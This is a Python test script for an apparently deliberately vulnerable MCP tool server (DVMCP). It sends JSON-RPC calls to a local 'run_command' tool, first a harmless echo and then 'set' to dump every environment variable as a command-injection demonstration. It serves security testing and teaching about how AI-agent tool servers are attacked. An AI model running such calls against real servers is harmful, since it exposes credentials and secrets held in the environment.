#!/usr/bin/env python3
"""
Simple DVMCP client to test vulnerabilities.
For testing MCP-05: Command Injection vulnerability.
"""

import json
import socket
import sys

def send_json_rpc_request(host, port, method, params=None):
    """Send a JSON-RPC 2.0 request via HTTP and return the response."""
    
    request_body = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": method,
    }
    if params:
        request_body["params"] = params
    
    request_json = json.dumps(request_body)
    
    # Build HTTP request
    http_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(request_json)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{request_json}"
    )
    
    print(f"\n{'='*70}")
    print(f"REQUEST (to {host}:{port})")
    print(f"{'='*70}")
    print(http_request)
    
    # Send request
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.sendall(http_request.encode())
    
    # Receive response
    response_data = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response_data += chunk
        except:
            break
    sock.close()
    
    response_text = response_data.decode('utf-8', errors='ignore')
    
    # Parse HTTP response
    if '\r\n\r\n' in response_text:
        headers, body = response_text.split('\r\n\r\n', 1)
    else:
        headers, body = response_text, ''
    
    print(f"\n{'='*70}")
    print(f"RESPONSE")
    print(f"{'='*70}")
    print(headers)
    print(f"\n{body}")
    
    # Try to parse JSON-RPC response
    try:
        json_response = json.loads(body)
        print(f"\n{'='*70}")
        print(f"PARSED JSON-RPC RESPONSE")
        print(f"{'='*70}")
        print(json.dumps(json_response, indent=2))
    except:
        pass
    
    return response_text

def test_command_injection(host='localhost', port=3001):
    """Test MCP-05: Command injection via run_command tool."""
    
    print("\n" + "="*70)
    print("TESTING MCP-05: COMMAND INJECTION")
    print("="*70)
    
    # Step 1: Initialize connection
    print("\nStep 1: Initialize MCP connection")
    send_json_rpc_request(host, port, 'initialize')
    
    # Step 2: List tools
    print("\nStep 2: List available tools")
    send_json_rpc_request(host, port, 'tools/list')
    
    # Step 3: Trigger command injection - safe command first (echo)
    print("\nStep 3: Call run_command with safe test")
    send_json_rpc_request(
        host, port, 
        'tools/call',
        {
            'name': 'run_command',
            'arguments': {
                'command': 'echo "MCP Security Test - Hello from DVMCP"'
            }
        }
    )
    
    # Step 4: Trigger actual vulnerability - read environment variables
    print("\nStep 4: Call run_command to read environment (demonstrating vulnerability)")
    send_json_rpc_request(
        host, port,
        'tools/call',
        {
            'name': 'run_command',
            'arguments': {
                'command': 'set'  # Windows: show all environment variables
            }
        }
    )

if __name__ == '__main__':
    try:
        test_command_injection()
    except ConnectionRefusedError:
        print("ERROR: Could not connect to DVMCP server on localhost:3001")
        print("Make sure the server is running: node server.js")
        sys.exit(1)
    except Exception as e:
        print(f"ERROR: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
